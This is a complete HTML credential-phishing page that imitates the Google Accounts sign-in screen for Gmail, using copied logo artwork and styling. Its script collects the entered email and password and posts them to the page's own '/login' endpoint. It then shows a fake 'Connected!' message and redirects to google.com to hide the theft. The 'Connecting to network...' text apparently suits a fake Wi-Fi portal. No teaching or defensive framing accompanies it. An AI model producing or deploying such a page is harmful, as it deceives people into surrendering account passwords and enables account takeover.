<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            width: 450px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }
        .logo { margin-bottom: 16px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
        .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }
        .input-group {
            margin-bottom: 16px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 4px;
        }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.15s;
        }
        .input-group input:focus {
            border-color: #1a73e8;
        }
        .btn {
            width: 100%;
            padding: 12px 24px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 8px;
        }
        .btn:hover { background: #1765cc; }
        .info {
            margin-top: 16px;
            font-size: 14px;
            color: #5f6368;
        }
        .info a { color: #1a73e8; text-decoration: none; }
        .info a:hover { text-decoration: underline; }
        .error {
            background: #fce8e6;
            color: #c5221f;
            padding: 12px;
            border-radius: 4px;
            margin-bottom: 16px;
            display: none;
            font-size: 14px;
        }
        .loading {
            display: none;
            margin-top: 16px;
            color: #5f6368;
            font-size: 14px;
        }
        .loading .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #dadce0;
            border-top-color: #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
            vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .footer { margin-top: 24px; font-size: 12px; color: #5f6368; }
        .footer a { color: #1a73e8; text-decoration: none; padding: 0 8px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
                <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335"/>
                <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05"/>
                <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4"/>
                <path d="M255 19.94v-7.54h9.25v52.02H255v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-2.94zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#34A853"/>
            </svg>
        </div>
        <h1>Sign in</h1>
        <p class="subtitle">to continue to Gmail</p>

        <div class="error" id="error-msg">
            Couldn't sign you in. Please check your email and password.
        </div>

        <form id="login-form" method="POST" action="/login">
            <div class="input-group">
                <label for="email">Email or phone</label>
                <input type="email" id="email" name="email" placeholder="Email or phone" required autofocus>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>
            <button type="submit" class="btn" id="signin-btn">Sign in</button>
        </form>

        <div class="loading" id="loading">
            <span class="spinner"></span>
            Connecting to network...
        </div>

        <div class="info">
            <a href="#">Create account</a>
        </div>

        <div class="footer">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var email = document.getElementById('email').value.trim();
            var password = document.getElementById('password').value.trim();
            
            if (!email || !password) {
                document.getElementById('error-msg').style.display = 'block';
                return;
            }

            document.getElementById('signin-btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            document.getElementById('error-msg').style.display = 'none';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/login', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    if (xhr.status === 200) {
                        document.getElementById('loading').innerHTML = 
                            '<span style="color:#34A853;">✓ Connected! Redirecting...</span>';
                        setTimeout(function() {
                            window.location.href = 'https://google.com';
                        }, 2000);
                    } else {
                        document.getElementById('signin-btn').style.display = 'block';
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('error-msg').style.display = 'block';
                    }
                }
            };
            xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
        });
    </script>
</body>
</html>
